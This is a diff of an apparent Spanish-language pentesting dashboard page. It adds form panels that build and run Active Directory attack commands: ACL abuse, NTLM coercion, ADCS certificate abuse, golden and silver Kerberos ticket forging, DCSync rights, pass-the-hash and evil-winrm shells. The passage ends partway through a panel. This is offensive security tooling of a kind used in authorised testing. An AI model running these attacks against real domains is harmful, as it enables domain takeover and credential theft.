@@ -8,7 +8,7 @@
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html{zoom:1.25}
+html{zoom:1}
 :root{
   --g:#00ff88;--g2:#7fffc0;--bg:#030604;--bg2:#060c08;--bg3:#09110a;
   --brd:#163019;--txt:#c8ffdc;--mut:#3d8a56;--dim:#163320;
@@ -16,7 +16,7 @@ html{zoom:1.25}
   --glow:0 0 8px rgba(0,255,136,.18);--glow-md:0 0 14px rgba(0,255,136,.22);
   --panel-bg:#050a06;--input-bg:#030604;
 }
-body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt);height:80vh;display:flex;flex-direction:column;overflow:hidden;font-size:13px}
+body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt);height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:13px}
 ::-webkit-scrollbar{width:4px;height:4px}
 ::-webkit-scrollbar-track{background:transparent}
 ::-webkit-scrollbar-thumb{background:#1e4a2a;border-radius:4px}
@@ -50,7 +50,7 @@ body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--txt
 .acc-arrow{font-size:12px;transition:transform .2s;opacity:.4}
 .acc-cat.open .acc-arrow{transform:rotate(90deg);opacity:.9}
 .acc-items{overflow:hidden;max-height:0;transition:max-height .25s ease}
-.acc-items.open{max-height:500px}
+.acc-items.open{max-height:900px}
 .s-item{padding:4px 8px 4px 13px;font-size:12px;color:var(--mut);cursor:pointer;display:flex;align-items:center;gap:6px;border-left:2px solid transparent;white-space:nowrap;transition:all .12s;position:relative;letter-spacing:.5px}
 .s-item:hover{color:var(--g2);background:#0a160b;border-left-color:#1a3a20}
 .s-item.active{color:var(--g);background:linear-gradient(90deg,#0d1e0f 0%,#080e09 100%);border-left-color:var(--g);box-shadow:inset 0 0 12px rgba(0,255,136,.04)}
@@ -316,6 +316,21 @@ textarea.fi{resize:vertical;min-height:48px}
 .val-msg.err{background:#150505;border:1px solid #5a1818;border-left-color:var(--red);color:#ff9090}
 .val-msg.warn{background:#100f03;border:1px solid #4a3c08;border-left-color:var(--yellow);color:var(--yellow)}
 .val-msg.ok{background:#040d05;border:1px solid #1a3a20;border-left-color:var(--g);color:var(--g)}
+
+/* ─── TOOL STATUS BAR (paneles AD) ──────────────────── */
+.t-bar{display:flex;align-items:center;gap:7px;padding:4px 9px;border-radius:3px;border:1px solid #162516;background:#020403;font-size:11px;margin-bottom:7px;min-height:24px;flex-wrap:wrap}
+.t-bar.ok{border-color:#1a3a1a;background:#020604}
+.t-bar.missing{border-color:#3a1010;background:#080202}
+.t-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;background:var(--dim);transition:all .2s}
+.t-bar.ok .t-dot{background:var(--g);box-shadow:0 0 4px rgba(0,255,136,.5)}
+.t-bar.missing .t-dot{background:#8a2020}
+.t-name{color:var(--mut);flex:1;letter-spacing:.5px}
+.t-bar.ok .t-name{color:var(--g)}
+.t-bar.missing .t-name{color:#ff8070}
+.ibtn{font-size:11px;padding:1px 9px;border:1px solid #a07010;background:#090600;color:#c8a020;cursor:pointer;border-radius:2px;font-family:inherit;letter-spacing:1px;transition:all .12s;flex-shrink:0}
+.ibtn:hover{background:#130e00;color:#e8c030;border-color:#e8c030}
+.ibtn.spin{pointer-events:none;opacity:.6;color:var(--mut)}
+.ibtn.done{border-color:var(--g);color:var(--g);pointer-events:none}
 
 /* ─── ADVANCED TOGGLE ────────────────────────────────── */
 .adv-toggle{font-size:12px;color:var(--dim);cursor:pointer;padding:4px 0;letter-spacing:2px;display:inline-flex;align-items:center;gap:5px;margin-bottom:5px;user-select:none}
@@ -588,6 +603,12 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="s-item" onclick="sw('ad-creds',this)"><div class="s-dot"></div><span class="s-icon">⊕</span>CREDENTIALS</div>
     <div class="s-item" onclick="sw('ad-map',this)"><div class="s-dot"></div><span class="s-icon">◉</span>BLOODHOUND</div>
     <div class="s-item" onclick="sw('ad-mitm',this)"><div class="s-dot"></div><span class="s-icon">⊗</span>MITM</div>
+    <div class="s-item" onclick="sw('ad-acl',this)"><div class="s-dot"></div><span class="s-icon">⊗</span>ACL ABUSE</div>
+    <div class="s-item" onclick="sw('ad-coerce',this)"><div class="s-dot"></div><span class="s-icon">⊘</span>COERCION</div>
+    <div class="s-item" onclick="sw('ad-cert',this)"><div class="s-dot"></div><span class="s-icon">◈</span>ADCS</div>
+    <div class="s-item" onclick="sw('ad-tickets',this)"><div class="s-dot"></div><span class="s-icon">⚿</span>TICKETS</div>
+    <div class="s-item" onclick="sw('ad-winrm',this)"><div class="s-dot"></div><span class="s-icon">▶</span>EVIL-WINRM</div>
+    <div class="s-item" onclick="sw('ad-postex',this)"><div class="s-dot"></div><span class="s-icon">≡</span>POST-EXPLOIT</div>
   </div>
 
   <!-- NETWORK -->
@@ -1551,6 +1572,7 @@ textarea.fi{resize:vertical;min-height:48px}
       <select class="fi" id="ae-t" onchange="bAdEnum()">
         <option>ldapdomaindump</option><option>enum4linux-ng</option>
         <option>rpcclient</option><option>smbclient</option><option>ldapsearch</option>
+        <option>windapsearch</option><option>ldeep</option><option>adidnsdump</option>
       </select></div>
   </div>
   <div class="row">
@@ -1570,16 +1592,29 @@ textarea.fi{resize:vertical;min-height:48px}
 <div id="p-ad-smb" class="panel">
   <div class="pt">SMB ACCESS <span class="ptd">— smbmap, crackmapexec / netexec</span></div>
   <div class="row">
-    <div class="ig w2"><div class="lbl">TARGET / RANGO</div><input class="fi" id="sm-h" placeholder="192.168.1.0/24" oninput="bSmb()"></div>
+    <div class="ig w2"><div class="lbl">TARGET / RANGO</div><input class="fi" id="sm-h" placeholder="192.168.1.10 o 192.168.1.0/24" oninput="bSmb()"></div>
     <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="sm-d" placeholder="domain.local" oninput="bSmb()"></div>
     <div class="ig"><div class="lbl">TOOL</div>
       <select class="fi" id="sm-t" onchange="bSmb()">
-        <option>crackmapexec</option><option>netexec</option><option>nxc</option><option>smbmap</option>
-      </select></div>
+        <option value="crackmapexec">crackmapexec</option>
+        <option value="netexec">netexec</option>
+        <option value="nxc">nxc</option>
+        <option value="smbmap">smbmap</option>
+      </select>
+    </div>
   </div>
   <div class="row">
     <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="sm-u" placeholder="user" oninput="bSmb()"></div>
-    <div class="ig"><div class="lbl">PASSWORD / HASH</div><input class="fi" id="sm-p" placeholder="Password1!" oninput="bSmb()"></div>
+    <div class="ig">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px">
+        <span class="lbl" style="margin:0">PASSWORD / HASH</span>
+        <span id="sm-cred-badge" style="font-size:10px;padding:2px 7px;border-radius:2px;letter-spacing:1px;border:1px solid var(--brd);color:var(--mut)">PASSWORD</span>
+      </div>
+      <input class="fi" id="sm-p" placeholder="Password1!  ó  NTLMHASH(32hex)  ó  LM:NTLM" oninput="bSmb()">
+    </div>
+  </div>
+  <div id="sm-hash-warn" style="display:none;font-size:12px;color:var(--yellow);padding:3px 0 6px;letter-spacing:.3px">
+    ⚠ Hash detectado — smbmap no soporta Pass-the-Hash de forma nativa. Usa crackmapexec / netexec para PTH confiable.
   </div>
   <div class="checks" id="sm-mod">
     <div class="ck" data-v="--shares">--shares</div><div class="ck" data-v="--users">--users</div>
@@ -1632,7 +1667,7 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="ig"><div class="lbl">TOOL</div>
       <select class="fi" id="ex-t" onchange="bExec()">
         <option>psexec.py</option><option>wmiexec.py</option>
-        <option>smbexec.py</option><option>atexec.py</option>
+        <option>smbexec.py</option><option>atexec.py</option><option>dcomexec.py</option>
       </select></div>
   </div>
   <div class="row">
@@ -1721,6 +1756,444 @@ textarea.fi{resize:vertical;min-height:48px}
     <button class="kbtn" onclick="cpCmd('mt-cmd')">COPY</button>
   </div>
   <div class="out-area" id="mt-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('mt-out')">CLEAR</button></div><div class="out-content" id="mt-out-c"></div></div>
+</div>
+
+<!-- ══ AD ACL ABUSE ══ -->
+<div id="p-ad-acl" class="panel">
+  <div class="pt">ACL ABUSE <span class="ptd">— dacledit, owneredit, bloodyAD, pyWhisker</span></div>
+  <div class="t-bar" id="acl-tbar"><div class="t-dot"></div><span class="t-name">verificando herramientas...</span></div>
+  <div id="acl-val" class="val-msg"></div>
+
+  <!-- Campos comunes -->
+  <div class="row">
+    <div class="ig w2"><div class="lbl">DC / IP</div><input class="fi" id="acl-dc" placeholder="192.168.1.10" oninput="bAcl()"></div>
+    <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="acl-dom" placeholder="domain.local" oninput="bAcl()"></div>
+    <div class="ig"><div class="lbl">HERRAMIENTA</div>
+      <select class="fi" id="acl-t" onchange="aclSwitch()">
+        <option value="dacledit">dacledit.py</option>
+        <option value="owneredit">owneredit.py</option>
+        <option value="bloodyad">bloodyAD</option>
+        <option value="pywhisker">pyWhisker</option>
+      </select>
+    </div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">USUARIO ATACANTE</div><input class="fi" id="acl-u" placeholder="user" oninput="bAcl()"></div>
+    <div class="ig"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="acl-p" placeholder="Password1!" oninput="bAcl()"></div>
+  </div>
+
+  <!-- dacledit.py -->
+  <div id="acl-sec-dacledit">
+    <div class="row">
+      <div class="ig"><div class="lbl">ACCIÓN</div>
+        <select class="fi" id="acl-dacl-act" onchange="aclDaclActSwitch()">
+          <option value="write">write — añadir ACE</option>
+          <option value="read">read — leer DACL</option>
+          <option value="remove">remove — quitar ACE</option>
+          <option value="flush">flush — limpiar DACL</option>
+        </select>
+      </div>
+      <div class="ig" id="acl-dacl-rights-grp"><div class="lbl">DERECHO</div>
+        <select class="fi" id="acl-dacl-rights" onchange="bAcl()">
+          <option value="FullControl">FullControl</option>
+          <option value="ResetPassword">ResetPassword</option>
+          <option value="WriteMembers">WriteMembers</option>
+          <option value="DCSync">DCSync</option>
+        </select>
+      </div>
+      <div class="ig"><div class="lbl" id="acl-dacl-target-lbl">TARGET (sAMAccountName)</div><input class="fi" id="acl-dacl-target" placeholder="victim" oninput="bAcl()"></div>
+    </div>
+    <div class="row">
+      <div class="ig" id="acl-dacl-princ-grp"><div class="lbl">PRINCIPAL (quién recibe el ACE)</div><input class="fi" id="acl-dacl-princ" placeholder="attacker" oninput="bAcl()"></div>
+      <div class="ig w2"><div class="lbl">TARGET-DN (opcional — si usas DN en vez de sAM)</div><input class="fi" id="acl-dacl-dn" placeholder="CN=victim,CN=Users,DC=domain,DC=local" oninput="bAcl()"></div>
+    </div>
+  </div>
+
+  <!-- owneredit.py -->
+  <div id="acl-sec-owneredit" style="display:none">
+    <div class="row">
+      <div class="ig"><div class="lbl">ACCIÓN</div>
+        <select class="fi" id="acl-own-act" onchange="aclOwnActSwitch()">
+          <option value="write">write — cambiar propietario</option>
+          <option value="read">read — ver propietario actual</option>
+        </select>
+      </div>
+      <div class="ig"><div class="lbl">TARGET (sAMAccountName)</div><input class="fi" id="acl-own-target" placeholder="victim" oninput="bAcl()"></div>
+      <div class="ig" id="acl-own-newowner-grp"><div class="lbl">NUEVO OWNER (sAMAccountName)</div><input class="fi" id="acl-own-newowner" placeholder="attacker" oninput="bAcl()"></div>
+    </div>
+    <div class="row">
+      <div class="ig w3"><div class="lbl">TARGET-DN (opcional)</div><input class="fi" id="acl-own-dn" placeholder="CN=victim,CN=Users,DC=domain,DC=local" oninput="bAcl()"></div>
+    </div>
+  </div>
+
+  <!-- bloodyAD -->
+  <div id="acl-sec-bloodyad" style="display:none">
+    <div class="row">
+      <div class="ig w2"><div class="lbl">COMANDO</div>
+        <select class="fi" id="acl-bld-cmd" onchange="aclBldSwitch()">
+          <option value="add groupMember">add groupMember — añadir usuario a grupo</option>
+          <option value="remove groupMember">remove groupMember — quitar de grupo</option>
+          <option value="add genericAll">add genericAll — GenericAll sobre objeto</option>
+          <option value="remove genericAll">remove genericAll</option>
+          <option value="add rbcd">add rbcd — RBCD (Resource-Based Constrained Delegation)</option>
+          <option value="remove rbcd">remove rbcd</option>
+          <option value="add dcsync">add dcsync — conceder derechos DCSync</option>
+          <option value="remove dcsync">remove dcsync</option>
+          <option value="add shadowCredentials">add shadowCredentials</option>
+          <option value="remove shadowCredentials">remove shadowCredentials</option>
+          <option value="set password">set password — cambiar contraseña</option>
+          <option value="get object">get object — leer atributo</option>
+        </select>
+      </div>
+    </div>
+    <div class="row">
+      <div class="ig" id="acl-bld-a1w"><div class="lbl" id="acl-bld-a1l">GRUPO</div><input class="fi" id="acl-bld-a1" placeholder="Domain Admins" oninput="bAcl()"></div>
+      <div class="ig" id="acl-bld-a2w"><div class="lbl" id="acl-bld-a2l">MIEMBRO</div><input class="fi" id="acl-bld-a2" placeholder="attacker" oninput="bAcl()"></div>
+    </div>
+  </div>
+
+  <!-- pyWhisker -->
+  <div id="acl-sec-pywhisker" style="display:none">
+    <div class="row">
+      <div class="ig"><div class="lbl">ACCIÓN</div>
+        <select class="fi" id="acl-pw-act" onchange="aclPwSwitch()">
+          <option value="add">add — agregar shadow credential</option>
+          <option value="list">list — listar shadow credentials</option>
+          <option value="remove">remove — eliminar por device-id</option>
+          <option value="clear">clear — eliminar todas</option>
+        </select>
+      </div>
+      <div class="ig"><div class="lbl">TARGET (sAMAccountName)</div><input class="fi" id="acl-pw-target" placeholder="victim$" oninput="bAcl()"></div>
+      <div class="ig" id="acl-pw-fname-grp"><div class="lbl">FILENAME (sin extensión)</div><input class="fi" id="acl-pw-fname" value="/tmp/shadow_cred" oninput="bAcl()"></div>
+      <div class="ig" id="acl-pw-devid-grp" style="display:none"><div class="lbl">DEVICE-ID (del list)</div><input class="fi" id="acl-pw-devid" placeholder="abc123-..." oninput="bAcl()"></div>
+    </div>
+  </div>
+
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="acl-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="acl-run" onclick="runTool('acl')">▶ EJECUTAR</button>
+    <button class="sbtn" id="acl-stop" onclick="stopTool('acl')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('acl-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="acl-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('acl-out')">CLEAR</button></div><div class="out-content" id="acl-out-c"></div></div>
+</div>
+
+<!-- ══ AD COERCION ══ -->
+<div id="p-ad-coerce" class="panel">
+  <div class="pt">COERCION <span class="ptd">— Coercer, PetitPotam, dfscoerce</span></div>
+  <div class="t-bar" id="crc-tbar"><div class="t-dot"></div><span class="t-name">verificando herramientas...</span></div>
+  <div id="crc-val" class="val-msg"></div>
+  <div class="row">
+    <div class="ig"><div class="lbl">LISTENER IP (atacante)</div><input class="fi" id="crc-lh" placeholder="192.168.1.5" oninput="bCoerce()"></div>
+    <div class="ig"><div class="lbl">TARGET (DC / host)</div><input class="fi" id="crc-tgt" placeholder="192.168.1.10" oninput="bCoerce()"></div>
+    <div class="ig"><div class="lbl">HERRAMIENTA</div>
+      <select class="fi" id="crc-t" onchange="crcInvalidate(this.value==='Coercer'?'coercer':this.value);bCoerce()">
+        <option>Coercer</option><option>PetitPotam</option><option>dfscoerce</option>
+      </select></div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">USUARIO (opt)</div><input class="fi" id="crc-u" placeholder="user" oninput="bCoerce()"></div>
+    <div class="ig"><div class="lbl">PASSWORD (opt)</div><input class="fi" id="crc-p" placeholder="Password1!" oninput="bCoerce()"></div>
+    <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="crc-dom" placeholder="domain.local" oninput="bCoerce()"></div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="crc-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="crc-run" onclick="crcRun()">▶ EJECUTAR</button>
+    <button class="sbtn" id="crc-stop" onclick="stopTool('crc')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('crc-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="crc-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('crc-out')">CLEAR</button></div><div class="out-content" id="crc-out-c"></div></div>
+</div>
+
+<!-- ══ AD ADCS / CERTIPY ══ -->
+<div id="p-ad-cert" class="panel">
+  <div class="pt">ADCS <span class="ptd">— certipy AD Certificate Services</span></div>
+  <div class="t-bar" id="adc-tbar"><div class="t-dot"></div><span class="t-name">verificando certipy...</span></div>
+  <div id="adc-val" class="val-msg"></div>
+  <div class="tabs">
+    <div class="tab on" onclick="stab('adc','find',this)">FIND</div>
+    <div class="tab" onclick="stab('adc','req',this)">REQUEST</div>
+    <div class="tab" onclick="stab('adc','auth',this)">AUTH</div>
+    <div class="tab" onclick="stab('adc','relay',this)">RELAY</div>
+  </div>
+  <!-- FIND -->
+  <div id="adc-find" class="tab-content on">
+    <div class="row">
+      <div class="ig w2"><div class="lbl">DC IP</div><input class="fi" id="adc-dc" placeholder="192.168.1.10" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="adc-dom" placeholder="domain.local" oninput="bCert()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="adc-u" placeholder="user" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">PASSWORD</div><input class="fi" id="adc-p" placeholder="Password1!" oninput="bCert()"></div>
+    </div>
+    <div class="checks" id="adc-find-opts">
+      <div class="ck on" data-v="-vulnerable">-vulnerable</div>
+      <div class="ck" data-v="-enabled">-enabled</div>
+      <div class="ck" data-v="-text">-text</div>
+      <div class="ck" data-v="-json">-json</div>
+    </div>
+  </div>
+  <!-- REQUEST -->
+  <div id="adc-req" class="tab-content">
+    <div class="row">
+      <div class="ig w2"><div class="lbl">CA (Certificate Authority)</div><input class="fi" id="adc-ca" placeholder="domain-CA" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">TEMPLATE</div><input class="fi" id="adc-tmpl" placeholder="User" oninput="bCert()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">UPN / ALT NAME</div><input class="fi" id="adc-upn" placeholder="administrator@domain.local" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">OUTPUT (.pfx)</div><input class="fi" id="adc-outfile" placeholder="/tmp/admin.pfx" oninput="bCert()"></div>
+    </div>
+  </div>
+  <!-- AUTH -->
+  <div id="adc-auth" class="tab-content">
+    <div class="row">
+      <div class="ig"><div class="lbl">CERTIFICADO (.pfx)</div><input class="fi" id="adc-pfx" placeholder="/tmp/admin.pfx" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="adc-adom" placeholder="domain.local" oninput="bCert()"></div>
+    </div>
+  </div>
+  <!-- RELAY -->
+  <div id="adc-relay" class="tab-content">
+    <div class="row">
+      <div class="ig"><div class="lbl">CA TARGET</div><input class="fi" id="adc-rca" placeholder="192.168.1.10" oninput="bCert()"></div>
+      <div class="ig"><div class="lbl">TEMPLATE</div><input class="fi" id="adc-rtmpl" placeholder="DomainController" oninput="bCert()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">INTERFAZ</div><input class="fi" id="adc-rif" placeholder="eth0" oninput="bCert()"></div>
+    </div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="adc-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="adc-run" onclick="runTool('adc')">▶ EJECUTAR</button>
+    <button class="sbtn" id="adc-stop" onclick="stopTool('adc')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('adc-cmd')">COPY</button>
+  </div>
+  <div class="out-area" id="adc-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('adc-out')">CLEAR</button></div><div class="out-content" id="adc-out-c"></div></div>
+</div>
+
+<!-- ══ AD TICKETS ══ -->
+<div id="p-ad-tickets" class="panel">
+  <div class="pt">TICKETS <span class="ptd">— getTGT, getST, ticketer (Impacket)</span></div>
+  <div class="t-bar" id="tkt-tbar"><div class="t-dot"></div><span class="t-name">verificando impacket...</span></div>
+  <div id="tkt-val" class="val-msg"></div>
+  <div class="tabs">
+    <div class="tab on" onclick="stab('tkt','tgt',this)">getTGT</div>
+    <div class="tab" onclick="stab('tkt','st',this)">getST</div>
+    <div class="tab" onclick="stab('tkt','forge',this)">TICKETER</div>
+  </div>
+  <!-- getTGT -->
+  <div id="tkt-tgt" class="tab-content on">
+    <div style="margin-bottom:8px;padding:7px 10px;background:#020605;border:1px solid #0d2312;border-radius:3px;font-size:12px;color:var(--mut);line-height:1.8">
+      <span style="color:var(--g);letter-spacing:.5px;font-weight:600">getTGT</span> — Solicita un TGT (Ticket Granting Ticket) al KDC con usuario + contraseña o hash NTLM (Pass-the-Hash).<br>
+      <span style="color:var(--txt)">Output:</span> genera <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">usuario.ccache</code> automáticamente en el directorio actual — luego usar <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">SET KRB5</code> o exportar manualmente.<br>
+      <span style="color:var(--yellow)">Falla si:</span> credenciales incorrectas · cuenta bloqueada · reloj desincronizado &gt;5 min con el DC · DC inaccesible por red
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="tgt-dom" placeholder="domain.local" oninput="bTickets()"></div>
+      <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="tgt-u" placeholder="user" oninput="bTickets()"></div>
+      <div class="ig w2"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="tgt-p" placeholder="Password1!" oninput="bTickets()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">DC IP</div><input class="fi" id="tgt-dc" placeholder="192.168.1.10" oninput="bTickets()"></div>
+      <div class="ig" style="align-self:flex-end;padding-bottom:4px">
+        <span style="font-size:11px;color:var(--mut);letter-spacing:.3px">Output: </span><span id="tgt-ccache-name" style="font-size:11px;color:var(--g)">usuario.ccache</span><span style="font-size:11px;color:var(--mut)"> — generado automáticamente en el directorio actual</span>
+      </div>
+    </div>
+  </div>
+  <!-- getST -->
+  <div id="tkt-st" class="tab-content">
+    <div style="margin-bottom:8px;padding:7px 10px;background:#050401;border:1px solid #2a1a00;border-radius:3px;font-size:12px;color:var(--mut);line-height:1.8">
+      <span style="color:var(--yellow);letter-spacing:.5px;font-weight:600">getST</span> — Pide un Service Ticket (TGS) para un SPN específico del dominio. Requiere un TGT válido o credenciales.<br>
+      <span style="color:var(--txt)">SPN:</span> el hostname debe ser el <span style="color:var(--cyan)">nombre real registrado en AD</span> — ej: <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">DC01</code> o <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">DC01.domain.local</code> (no una IP)<br>
+      <span style="color:var(--red)">KDC_ERR_S_PRINCIPAL_UNKNOWN</span> → el SPN no existe en AD — verifica hostname y protocolo con <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">setspn -Q */*</code><br>
+      <span style="color:var(--txt)">S4U2Self:</span> impersonar otro usuario sobre la cuenta actual · <span style="color:var(--txt)">S4U2Self+Proxy:</span> RBCD / delegación (requiere <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">msDS-AllowedToActOnBehalfOfOtherIdentity</code>)
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="st-dom" placeholder="domain.local" oninput="bTickets()"></div>
+      <div class="ig"><div class="lbl">USUARIO (cuenta de servicio)</div><input class="fi" id="st-u" placeholder="serviceaccount$" oninput="bTickets()"></div>
+      <div class="ig w2"><div class="lbl">PASSWORD / HASH (LM:NT)</div><input class="fi" id="st-p" placeholder="Password1!" oninput="bTickets()"></div>
+    </div>
+    <div class="row">
+      <div class="ig" style="max-width:110px"><div class="lbl">PROTOCOLO SPN</div>
+        <select class="fi" id="st-proto" onchange="bTickets()">
+          <option value="cifs">cifs</option>
+          <option value="ldap">ldap</option>
+          <option value="ldaps">ldaps</option>
+          <option value="host">host</option>
+          <option value="http">http</option>
+          <option value="mssql">mssql</option>
+          <option value="wsman">wsman</option>
+        </select>
+      </div>
+      <div class="ig w2"><div class="lbl">HOSTNAME / FQDN del TARGET (nombre real — ej: DC01 o DC01.domain.local)</div><input class="fi" id="st-hn" placeholder="DC01" oninput="bTickets()"></div>
+      <div class="ig"><div class="lbl">DC IP</div><input class="fi" id="st-dc" placeholder="192.168.1.10" oninput="bTickets()"></div>
+    </div>
+    <div class="row">
+      <div class="ig" style="max-width:190px"><div class="lbl">MODO</div>
+        <select class="fi" id="st-mode" onchange="tktModeSwitch()">
+          <option value="normal">Normal — TGS directo</option>
+          <option value="s4u2self">S4U2Self</option>
+          <option value="s4u2proxy">S4U2Self+Proxy (RBCD)</option>
+        </select>
+      </div>
+      <div class="ig" id="st-imper-grp" style="display:none"><div class="lbl">USUARIO A IMPERSONAR</div><input class="fi" id="st-imper" placeholder="Administrator" oninput="bTickets()"></div>
+    </div>
+  </div>
+  <!-- TICKETER (Golden/Silver) -->
+  <div id="tkt-forge" class="tab-content">
+    <div style="margin-bottom:8px;padding:7px 10px;background:#060202;border:1px solid #2a0808;border-radius:3px;font-size:12px;color:var(--mut);line-height:1.8">
+      <span style="color:var(--red);letter-spacing:.5px;font-weight:600">TICKETER</span> — Forja tickets Kerberos offline. Requiere hashes comprometidos — no funciona con credenciales normales.<br>
+      <span style="color:var(--txt)">Golden Ticket:</span> hash NTLM de <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">krbtgt</code> + SID del dominio → acceso total sin expirar · deja SPN vacío<br>
+      <span style="color:var(--txt)">Silver Ticket:</span> hash NTLM de la <span style="color:var(--cyan)">cuenta de servicio</span> + SPN específico → acceso solo a ese servicio · sin contacto al KDC<br>
+      <span style="color:var(--yellow)">Obtener SID:</span> <code style="color:var(--cyan);background:#010304;padding:1px 5px;border-radius:2px">lookupsid.py domain/user@DC</code> · <span style="color:var(--yellow)">Obtener krbtgt hash:</span> secretsdump / DCSync / hashdump
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">DOMINIO</div><input class="fi" id="fgt-dom" placeholder="domain.local" oninput="bTickets()"></div>
+      <div class="ig"><div class="lbl">DOMAIN SID</div><input class="fi" id="fgt-sid" placeholder="S-1-5-21-..." oninput="bTickets()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">USUARIO / CN</div><input class="fi" id="fgt-u" placeholder="Administrator" oninput="bTickets()"></div>
+      <div class="ig w2"><div class="lbl">NTLM HASH (krbtgt o servicio)</div><input class="fi" id="fgt-h" placeholder="aabbcc..." oninput="bTickets()"></div>
+    </div>
+    <div class="row">
+      <div class="ig"><div class="lbl">SPN (Silver ticket — vacío = Golden)</div><input class="fi" id="fgt-spn" placeholder="cifs/dc.domain.local" oninput="bTickets()"></div>
+      <div class="ig" style="max-width:90px"><div class="lbl">GRUPOS</div><input class="fi" id="fgt-grp" placeholder="512,519" oninput="bTickets()"></div>
+    </div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="tkt-cmd"></div></div>
+  <div class="run-row">
+    <button class="rbtn" id="tkt-run" onclick="runTool('tkt')">▶ EJECUTAR</button>
+    <button class="sbtn" id="tkt-stop" onclick="stopTool('tkt')" disabled>■ STOP</button>
+    <button class="kbtn" onclick="cpCmd('tkt-cmd')">COPY</button>
+    <button class="kbtn" onclick="tktSetKrb5()">SET KRB5</button>
+  </div>
+  <div class="out-area" id="tkt-out"><div class="out-hdr"><span class="out-title">OUTPUT</span><button class="kbtn" onclick="clrOut('tkt-out')">CLEAR</button></div><div class="out-content" id="tkt-out-c"></div></div>
+</div>
+
+<!-- ══ EVIL-WINRM ══ -->
+<div id="p-ad-winrm" class="panel">
+  <div class="pt">EVIL-WINRM <span class="ptd">— WinRM shell para pentesting</span></div>
+  <div class="t-bar" id="ew-tbar"><div class="t-dot"></div><span class="t-name">verificando evil-winrm...</span></div>
+  <div id="ew-val" class="val-msg"></div>
+  <div class="row">
+    <div class="ig w2"><div class="lbl">TARGET</div><input class="fi" id="ew-h" placeholder="192.168.1.10" oninput="bWinrm()"></div>
+    <div class="ig"><div class="lbl">USUARIO</div><input class="fi" id="ew-u" placeholder="Administrator" oninput="bWinrm()"></div>
+    <div class="ig"><div class="lbl">PASSWORD / HASH (NTLM)</div><input class="fi" id="ew-p" placeholder="Password1!" oninput="bWinrm()"></div>
+  </div>
+  <div class="row">
+    <div class="ig"><div class="lbl">SCRIPTS DIR (-s)</div><input class="fi" id="ew-s" placeholder="/opt/evil-winrm/resources" oninput="bWinrm()"></div>
+    <div class="ig"><div class="lbl">EXECUTABLES DIR (-e)</div><input class="fi" id="ew-e" placeholder="/opt/evil-winrm/resources" oninput="bWinrm()"></div>
+  </div>
+  <div class="checks" id="ew-opts">
+    <div class="ck" data-v="--ssl">--ssl</div>
+    <div class="ck" data-v="-P 5986">-P 5986 (HTTPS)</div>
+    <div class="ck" data-v="--no-colors">--no-colors</div>
+  </div>
+  <div class="cmd-preview"><div class="cmd-lbl">COMANDO</div><div class="cmd-text" id="ew-cmd"></div></div>
+  <div class="run-row">
